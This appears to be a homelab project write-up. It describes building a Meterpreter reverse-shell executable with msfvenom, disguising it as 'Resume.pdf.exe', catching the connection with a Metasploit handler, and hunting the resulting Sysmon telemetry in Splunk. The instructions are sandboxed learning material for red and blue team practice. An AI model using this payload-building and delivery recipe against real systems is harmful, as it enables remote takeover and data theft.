# ActiveDirectory (Kali/ART/Splunk) Project

Objective
In the field of cybersecurity, we need an environment to test new tools and learn new techniques. The intention for this project is to build a cybersecurity homelab in order to execute malware and other exploits so that we can gain insights, observe telemtry/alerts, and learn about malicious indicators of compromise (IOCs). We opt to experiment in a virtual environment (preferably a sandbox) so that we dont cause unnecessary harm to a production or valuable environment. In this instance we will use virtual box. The tools we will be using will be a target Windows 10 host machine that has Sysmon and the Splunk SIEM downloaded and deployed. The other tool will be an attacker machine using Kali Linux. We will craft our own exploit and malware in Kali to send it to our target host. We will then switch to our target machine and execute the malware on there. This homelab fullfils two obejectives; a blue team and a red team objective. The defense tools on our target host help us observe telemetry and logs to see what charactersistics an exploit or attack might consist of in real time. On the other hand, the ethical hacking done on our attacker kali machine helps us understand how attackers craft malware, identify vulnerabillities, and compromise their targets.

Skills Learned
Red Team: How to run and configure Kali Linux and tools within the system
Blue Team: Configure and deploy Splunk Enterprise with Sysmon feeding it data
Setup an internal network and statically assign IPs so that two hosts can establish connections
Use commands like ipconfif, ifconfig, ping, and netstat. This helped with checking host IPs, checking whether a host can be pinged, and checking what connections are established on my machine
Nmap to scan ports to see what their statuses are
Metasploit to listen in with a multi handler
Crafting malware with a payload using msfvenom tool
Create a http server to host the malware on
Identify telemtry via Splunk and apply curated searches and investigations to look deep into data
Tools Used
Vitualbox
Windows 10
Kali Linux
Splunk Enterprise
Sysmon
Python3 -m
Msfvenom
Msfconsole
Meterpreter Reverse Shell TCP
Nmap
Windows task manager
Windows Command Prompt
Steps
Step 1: We first must start by making sure that the Splunk on our target host is configured to properly ingest data transferred from Windows Sysymon into an index created inside Splunk. This is done by editing the inputs.conf file to make sure sysmon is configured in the Splunk's inputs.conf file to be ingested. Then we paste this edited inputs.conf file into the local folder in Splunk and restart the service so that it is saved. This should be done first since we want to observe how the host reacts and what it alerts after the malware has been executed.

Cyber SOC Homelab Steps
Step 2: After placing the inputs.conf file in the local folder of Splunk and restarting the process, we now have to create an index in Splunk Enterprise called " endpoint". This is because that is what is written in the inputs.conf file and it will know exactly where to dump the data within the Splunk application. We also need to download an add-on app in Splunk that helps us parse incoming Sysmon data.

Cyber SOC Homelab Steps Cyber SOC Homelab Steps

Step 3: On target Windows machine, we use the "ping" command on the command prompt followed by the IP address of the Kali machine to establish connectivity in the internal network we set up between the two machines. We can't do it the other way around because the Windows firewall rule blocks any incoming connections.

Cyber SOC Homelab Steps
Step 4: On the Kali attacker machine, we run "nmap" against the Windows target machines with the "-A" flag meaning scan all ports and the "Pn" flag meaning to skip pings. After nmap finished its scan on all ports, we see that port 3389 is open which is the port for Remote Desktop Protocol (RDP). This allows for remote connections to your host which is dangerous to have open in any production or enteprise environment.

Cyber SOC Homelab Steps

Step 5: Now its time to create our malware on our attacker Kali Linux machine. We use the "msfvenom" tool to build it. We start of by using a meterpreter reverse shell as our payload. To get a list of payloads; we use the "msfvenom -l payloads" command. We search through the list to find our meterpreter reverse shell payload and copy it to use fo later. Now we can compile the malware. The commad we use is as follows: msfvenom -p (add the copied payload here) lhost= (add the IP address of the attacker machine here) lport= (add the port for the meterpreter here which is 4444) -f (this flag is for the format the file we are creating is in which is exe) -o (this flag is for what you want to name your malware that the target will see; we will name it Resume.pdf.exe).

Cyber SOC Homelab Steps Cyber SOC Homelab Steps

Step 6: Next, we need open up a handler that will listen to the 4444 port that we configured in our malware. We do this by open up metasploit by typing "msfconsole". We will us the multi handler by typing in "use exploit/multi/handler" and clicking enter. We will be in teh exploit itself. From here we check the options to see what we can configure. We change the what is in the "payload options" from the default payload to the payload that we used for our malware. We also change the "lhost" section to our attacker machine's IP address and make sure all of these changes are saved. After this, we start the handler with the "exploit" command. Now we are listening in and waiting until our target machine executes our malware.

Cyber SOC Homelab Steps Cyber SOC Homelab Steps

-Step 7: We need to set up an HTTP server on our attacker Kali machine so that our target machine can download our malware. In this case we will use python to this in the same directory as our malware. We type "python3 -m http.server 9999" to create it and now our test machine should be able to access it and download our malware. Now we are done on Kali and must wait for our malware to be executed

Cyber SOC Homelab Steps

-Step 8: We hop back on our target Windows 10 machine and disable Windows Defender and anti virus. We head to our kali serviced web page that has the malware on it. We download the malware and run it. Now that the malware has been executed, we open up the command prompt with administrator privilages. We type in "netstat -anob" and we see an established connection to our Kali attacker machine. We also use the PID from that connection output and open it up on windows task manager to see that it is indeed the malware that was executed

Cyber SOC Homelab Steps Cyber SOC Homelab Steps Cyber SOC Homelab Steps

-Step 9: Jumping back to our Kali machine, it looks like we have a connection where we were listening in with our handler. Now we have control over the target machine. We now run a few commmands. We type in the "shell" command to establish a shell on our target machine. We also run the "net user", "net localgroup", and "ipconfig" commands to exfiltrate more information from the target machine. After this, we will check back on our Splunk SIEM to see what kind of telemetry has been generated.

Cyber SOC Homelab Steps Cyber SOC Homelab Steps Cyber SOC Homelab Steps

-Step 10: Back on our Splunk SIEM, we search for our "index=endpoint" but at the end of it we query the Kali attacker machine's IP address. It would like this "index=endpoint 192.168.20.11". We scroll down to discover that one destination port was targeted and it was the 3389 port for RDP. Some questions an analyst would ask are; "Should this machine be attempting to connect to RDP?, "What machine is this?", "Who does is belong to?", or "How is it able to listen into and scan my ports?".

Cyber SOC Homelab Steps

Step 11: We can further dig deeper into other events that were logged by Splunk. This time we can search with the name of the malware at the end so; "index=endpoint Resume.pdf.exe. We have 13 events and 7 event codes generated. We delve deeper by investigating the first event code out of 7. By expanding this event, we can see that a parent process had spawned another process which ran a cmd.exe. We also see the process id 5428 which we could use to query our data to see what that command had done. Instead we opt with the process guid. We copy the process guid characters and paste it at the end of our "index=enpoint" instead using the malware name or another process id. This would looklike: "index=endpoint d542c381... ". This shows use exactly which commands the attacker used to exfiltrate data displayed in our Splunk.

Cyber SOC Homelab Steps Cyber SOC Homelab Steps
